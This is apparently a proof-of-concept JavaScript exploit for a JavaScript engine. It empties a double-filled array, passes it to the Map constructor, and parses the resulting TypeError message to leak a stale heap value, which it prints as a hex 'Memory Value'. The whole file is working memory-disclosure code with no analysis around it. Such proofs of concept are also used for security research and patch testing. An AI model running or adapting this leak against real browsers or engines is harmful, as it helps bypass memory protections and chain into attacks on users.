const double2int = (v) => {
  let buf = new ArrayBuffer(8);
  let farr = new Float64Array(buf);
  let iarr = new Uint32Array(buf);
  farr[0] = v;
  let d = (iarr[1] * 0x100000000) + iarr[0];
  return d;
};

try {
  // Create a double elements array.
  let iterable = new Array(10);
  for (let i = 0; i < 10; i++) {
    iterable[i] = 123.123;
  }

  iterable.length = 0;

  new Map(iterable);
} catch (e) {
  console.log(e);
  let regex = /TypeError: Iterator value ([0-9\.e\-]+) is not an entry object/;
  let val = parseFloat(regex.exec(e)[1]);
  console.log(`Memory Value: ${double2int(val).toString(16)}`);
}
